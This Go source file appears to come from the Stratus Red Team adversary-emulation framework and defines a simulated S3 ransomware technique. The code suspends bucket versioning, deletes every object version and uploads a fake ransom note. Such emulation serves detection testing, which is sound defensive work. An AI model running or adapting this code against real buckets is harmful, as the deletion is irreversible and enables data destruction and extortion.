package aws

import (
	"context"
	_ "embed"
	"fmt"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/s3"
	"github.com/aws/aws-sdk-go-v2/service/s3/types"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus"
	"github.com/datadog/stratus-red-team/v2/pkg/stratus/mitreattack"
	"log"
	"strconv"
	"strings"
)

//go:embed main.tf
var tf []byte

const RansomNoteFilename = `FILES-DELETED.txt`
const RansomNoteContents = `Your data is backed up in a safe location. To negotiate with us for recovery, get in touch with rick@astley.io. In 7 days, if we don't hear from you, that data will either be sold or published, and might no longer be recoverable.'`

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:           "aws.impact.s3-ransomware",
		FriendlyName: "S3 Ransomware Activity",
		Description: `
Simulates S3 ransomware activity.

Warm-up: 

- Create an S3 bucket
- Create a number of files in the bucket, with random content and extensions

Detonation: 

- List buckets in the account
- List objects in the target bucket
- Retrieve versioning configuration of the bucket
- Retrieve a few random files from the bucket
- Disable versioning on the bucket
- Delete all objects in the bucket
- Upload a random note to the bucket

References:

- [The anatomy of a ransomware event targeting S3 (re:Inforce, 2022)](https://d1.awsstatic.com/events/aws-reinforce-2022/TDR431_The-anatomy-of-a-ransomware-event-targeting-data-residing-in-Amazon-S3.pdf)
- [Ransomware in the cloud](https://invictus-ir.medium.com/ransomware-in-the-cloud-7f14805bbe82)
`,
		Detection: `
TODO
`,
		Platform:                   stratus.AWS,
		IsIdempotent:               false, // ransomware cannot be reverted :)
		MitreAttackTactics:         []mitreattack.Tactic{mitreattack.Impact},
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string, providers stratus.CloudProviders) error {
	bucketName := params["bucket_name"]
	s3Client := s3.NewFromConfig(providers.AWS().GetConnection())

	log.Println("Simulating a ransomware attack on bucket " + bucketName)

	if err := disableVersioning(s3Client, bucketName); err != nil {
		return fmt.Errorf("failed to disable bucket versioning: %w", err)
	}

	if err := removeAllObjects(s3Client, bucketName); err != nil {
		return fmt.Errorf("failed to remove objects in the bucket: %w", err)
	}

	if err := uploadRansomNote(s3Client, bucketName); err != nil {
		return fmt.Errorf("failed to upload random note to the bucket: %w", err)
	}

	return nil
}

func disableVersioning(s3Client *s3.Client, bucketName string) error {
	log.Println("Disabling versioning on bucket " + bucketName)
	_, err := s3Client.PutBucketVersioning(context.Background(), &s3.PutBucketVersioningInput{
		Bucket: &bucketName,
		VersioningConfiguration: &types.VersioningConfiguration{
			MFADelete: types.MFADeleteDisabled,
			Status:    types.BucketVersioningStatusSuspended,
		},
	})
	return err
}

func removeAllObjects(s3Client *s3.Client, bucketName string) error {
	objects, err := listAllObjectVersions(s3Client, bucketName)
	if err != nil {
		return fmt.Errorf("unable to list bucket objects: %w", err)
	}
	log.Println("Found " + strconv.Itoa(len(objects)) + " object versions to delete")
	log.Println("Removing all objects")
	_, err = s3Client.DeleteObjects(context.Background(), &s3.DeleteObjectsInput{
		Bucket: &bucketName,
		Delete: &types.Delete{Objects: objects},
	})
	if err != nil {
		return fmt.Errorf("unable to delete bucket objects: %w", err)
	}
	log.Println("Successfully removed all objects from the bucket")
	return nil

}

func listAllObjectVersions(s3Client *s3.Client, bucketName string) ([]types.ObjectIdentifier, error) {
	log.Println("Listing objects in bucket " + bucketName)
	var result []types.ObjectIdentifier
	objectVersions, err := s3Client.ListObjectVersions(context.Background(), &s3.ListObjectVersionsInput{Bucket: &bucketName})
	if err != nil {
		return nil, fmt.Errorf("unable to list bucket objects: %w", err)
	}
	for _, objectVersion := range objectVersions.Versions {
		result = append(result, types.ObjectIdentifier{Key: objectVersion.Key, VersionId: objectVersion.VersionId})
	}
	return result, nil
}

func uploadRansomNote(s3Client *s3.Client, bucketName string) error {
	log.Println("Uploading fake ransom note")
	_, err := s3Client.PutObject(context.Background(), &s3.PutObjectInput{
		Bucket: &bucketName,
		Key:    aws.String(RansomNoteFilename),
		Body:   strings.NewReader(RansomNoteContents),
	})
	return err
}
